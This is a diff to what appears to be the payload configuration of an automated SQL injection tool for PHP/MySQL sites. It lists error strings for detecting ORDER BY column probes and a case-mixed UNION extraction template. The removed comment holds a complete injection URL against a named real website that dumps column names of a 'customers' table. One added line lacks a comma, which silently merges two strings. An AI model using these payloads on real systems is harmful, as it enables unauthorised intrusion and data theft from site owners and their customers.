@@ -30,7 +30,9 @@ define_error_order_by_php = [
     "You have an error in your SQL syntax",
     "You have an error in File",
     "mysql_fetch_array()",
-    "Unknown column '1000' in 'group statement'"
+    "Unknown column '1000' in 'group statement'",
+    "order by 1000 # ORDER BY"
+    "order by 1000"
 ]
 
 #Order by in php End
@@ -71,6 +73,3 @@ define_get_columns_of_table_convert_query_php = [
 define_extract_columns_query_php = [
     "ConCat(QUOTE(2134115356),ConVert(%s+UsIng+LAtin1),QUOTE(62134115356))"
 ]
-
-#http://www.jazzjournal.co.uk/article.php?id=-20%20UnIon%20SeLeCt%201111111111,%20CoNcaT(QUOTE(2134115356),%20ConVert(ColumN_NAME+UsIng+LAtin1),%20QUOTE(62134115356)),3333333333,4444444444,5555555555,6666666666,7777777777,8888888888,9999999999,10101010101010101010,11111111111111111111,12121212121212121212%20FROm%20iNforMation_sCheMa.COLUmns%20wHeRe%20tAblE_NamE=0x637573746f6d657273%20limit%200,%201%20%23
-                    
